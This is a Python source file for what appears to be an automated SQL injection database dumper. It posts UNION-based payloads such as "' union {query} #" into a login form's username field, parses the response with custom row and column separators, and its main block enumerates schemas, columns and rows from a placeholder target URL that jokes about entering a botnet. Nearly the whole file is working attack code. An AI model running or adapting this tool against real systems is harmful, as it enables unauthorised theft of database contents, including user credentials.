from query_executor import BaseQueryExecutor
import requests as req
import time

class HTTPPostRawResponseExecutor(BaseQueryExecutor):
    """
    
    """
    col_sep = "<@>"
    row_sep = "<#>"
    def __init__(self, url, payload, max_cols, min_cols, max_rows):
        self.url = url
        self.payload = payload
        self.max_cols, self.min_cols = max_cols, min_cols
        self.max_rows = max_rows
        #TODO: make http method and its paramenters parametrics

    def _raw_execute(self, raw_query):
        vun_field_value = self.payload.format(query=raw_query)
        #print(vun_field_value)
        #TODO: delay between request
        #TODO: handle errors 
        do_it = True
        tries = 0
        while do_it:
            res = req.post(self.url,
                            {'username':vun_field_value, 'password':'', 'action':'login'},
                            allow_redirects=False                    
                        )
            if res.status_code >= 200 and res.status_code < 400:
                do_it = False
            
            if tries>3:
                do_it = False 
            tries += 1
            time.sleep(0.1*tries) 
        return res.text

    def execute(self, columns, column_types, schema, table, raw_condition=None, distinct=False):
        #NOTE: the result # of cols must be between min_cols and max_cols (inclusive)
        #NOTE: if one of them is none that limit doesn't exist
        #NOTE: the are not explicit separator between rows items and differents rows
        #NOTE: <#> to separate rows and <@> to separate same row items
        rows = []
        if len(columns)*2 > self.max_cols:
                # do multiple query in such way that fit max_cols constrain
                step = self.max_cols//2
                tmp_rows = []
                for i in range(0,len(columns)*2//self.max_cols):
                    start, end = i*step, (i+1) * step
                    #the call the function itself with the reduced query
                    section = self.execute(columns[start:end], column_types[start:end], 
                                                schema,table, raw_condition, distinct)
                    tmp_rows.append(section)
                    if len(section) == 0:
                        #some error occurred :/
                        #TODO: debug->solve or at least handle it
                        return []
                # join result to single row
                rows = []
                for j, section in enumerate(tmp_rows):
                    for i, row_part in enumerate(section):
                        if j==0:
                            rows.append(row_part)
                        else:
                            rows[i].extend(row_part)
                return rows
        else:
            if self.max_rows is None:
                query = "SELECT " 
                query += "DISTINCT " if distinct else ""
                tmp = intersperse(columns,f"'{self.col_sep}'")
                tmp.append(f"'{self.row_sep}'")
                while len(tmp) < self.min_cols:
                    tmp.append("''")
                query += ", ".join(tmp)
                query += f" FROM {schema}.{table}"
                query += "" if raw_condition is None else f" WHERE {raw_condition}" 
                print(query)
                res = self._raw_execute(query).split(self.row_sep)
                #print(res)
                return [ [column_types[i](it.strip()) 
                            for i, it in enumerate(row.strip().split(self.col_sep))
                         ] 
                        for row in res][:-1]
            else:
                #i will not implement this
                return [] 

def intersperse(lst, item):
    #https://stackoverflow.com/a/5921708
    result = [item] * (len(lst) * 2 - 1)
    result[0::2] = lst
    return result


from dumper import *
if __name__ == "__main__":#
    db = HTTPPostRawResponseExecutor('http://se.mettiamo.quello.vero/entriamo/in/una/botnet',"' union {query} #",6,6,None)
    schemas = grep_schemas(db)
    schemas = grep_column_structures(db,schemas)
    schemas = grep_rows(db,schemas)

    pprint(schemas)
